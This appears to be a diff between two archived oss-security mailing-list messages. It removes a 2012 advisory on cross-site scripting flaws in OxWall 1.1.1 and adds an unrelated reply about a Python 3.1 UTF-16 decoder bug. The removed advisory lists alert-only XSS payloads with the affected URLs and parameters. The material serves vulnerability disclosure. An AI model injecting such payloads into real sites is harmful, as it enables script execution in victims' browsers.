@@ -1,102 +1,23 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/02/20/5
-Message-ID: <CAPYM6VxnCebiiTDCJ1=iLEY4_EFnNEzeCXjz8Xy0TRtx07ZCmg@mail.gmail.com>
-Date: Tue, 21 Feb 2012 00:53:46 +0800
-From: YGN Ethical Hacker Group <lists@...g.net>
-To: full-disclosure <full-disclosure@...ts.grok.org.uk>, bugtraq <bugtraq@...urityfocus.com>,  secalert@...urityreason.com, bugs@...uritytracker.com,  vuln <vuln@...unia.com>, vuln@...urity.nnov.ru, news@...uriteam.com,  moderators@...db.org, submissions@...ketstormsecurity.org,  submit@...ecurity.com, submit@...3ct0r.com, oss-security@...ts.openwall.com
-Subject: OxWall 1.1.1 <= Multiple Cross Site Scripting Vulnerabilities
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/04/25/7
+Message-ID: <20120425163137.GF2798@kludge.henri.nerv.fi>
+Date: Wed, 25 Apr 2012 19:31:37 +0300
+From: Henri Salo <henri@...v.fi>
+To: oss-security@...ts.openwall.com
+Subject: Re: CVE Request: Python 3.2/3.3 utf-16 decoder unicode_decode_call_errorhandler aligned_end is not updated
 Content-Type: text/plain; charset=utf-8
 
-1. OVERVIEW
+On Wed, Apr 25, 2012 at 12:50:55PM +0200, Florian Weimer wrote:
+> * Kurt Seifried:
+> 
+> > Python 3.2/3.3 utf-16 decoder unicode_decode_call_errorhandler
+> > aligned_end is not updated
+> >
+> > does not appear to affect Python 2.x
+> 
+> 3.1 seems to be affected as well (according to reproducer and commit
+> log).
 
-OxWall 1.1.1 and lower versions are vulnerable to Cross Site Scripting.
+Yes it is. I confirmed this also with Debian 3.1.3-12+squeeze1
 
-
-2. BACKGROUND
-
-Oxwall is a free open source software package for building social
-networks, family sites and collaboration systems. It is a flexible
-community website engine developed with the aim to provide people with
-a well-coded, user-friendly software platform for social needs. It is
-easy to set up, configure and manage Oxwall while you focus on your
-site idea. We are testing the concept of free open source community
-software for complete (site,sub-site setups) and partial
-(widgets,features) community and collaboration solutions for companies
-and individuals.
-
-
-3. VULNERABILITY DESCRIPTION
-
-Multiple parameters were not properly sanitized, which allows attacker
-to conduct Cross Site Scripting attack. This may allow an attacker to
-create a specially crafted URL that would execute arbitrary script
-code in a victim's browser.
-
-
-4. VERSIONS AFFECTED
-
-1.1.1 and lower
-
-
-5. PROOF-OF-CONCEPT/EXPLOIT
-
-URL: http://localhost/Oxwall/join
-
-Injected Attack String: '"><script>alert(/XSS/)</script>
-Method: HTTP POST
-Vulnerable Parameters: captchaField, email, form_name  ,password
-,realname  ,repeatPassword ,username
-
-------------------------------------------------------------------------------------
-
-URL: http://localhost/Oxwall/contact
-
-Injected Attack String: '"><script>alert(/XSS/)</script>
-Method: HTTP POST
-Vulnerable Parameters: captcha, email, form_name  ,from , subject
-------------------------------------------------------------------------------------
-
-URL: http://localhost/Oxwall/blogs/browse-by-tag?tag=%27%22%3E%3Cscript%3Ealert%28/XSS/%29%3C/script%3E
-Vulnerable Parameter: tag
-
-----------------------------------------------------------------------------
-
-Vulnerable Parameter: RAW-URI
-
-http://localhost/Oxwall/photo/viewlist/tagged/><img src=xs onerror=alert('XSS')>
-
-http://localhost/Oxwall/photo/viewlist/%22style%3d%22position:fixed;width:1000px;height:1000px;display:block;left:0;top:0%22onmouseover=alert%28%27XSS%27%29;%22x=
-
-http://localhost/Oxwall/video/viewlist/%22style%3d%22position:fixed;width:1000px;height:1000px;display:block;left:0;top:0%22onmouseover=alert%28%27XSS%27%29;%22x=
-
-
-6. SOLUTION
-
-Upgade to the latest version of Oxwall.
-
-
-7. VENDOR
-
-Oxwall Foundation
-http://www.oxwall.org/
-
-
-8. CREDIT
-
-Aung Khant, http://yehg.net, YGN Ethical Hacker Group, Myanmar.
-
-
-9. DISCLOSURE TIME-LINE
-
-2011-06-09: notified vendor
-2012-02-20: vulnerability disclosed
-
-
-10. REFERENCES
-
-Original Advisory URL:
-http://yehg.net/lab/pr0js/advisories/%5BOxWall_1.1.1%5D_xss
-Oxwall Home Page: http://www.oxwall.org/
-
-
-#yehg [2012-02-20]
+- Henri Salo
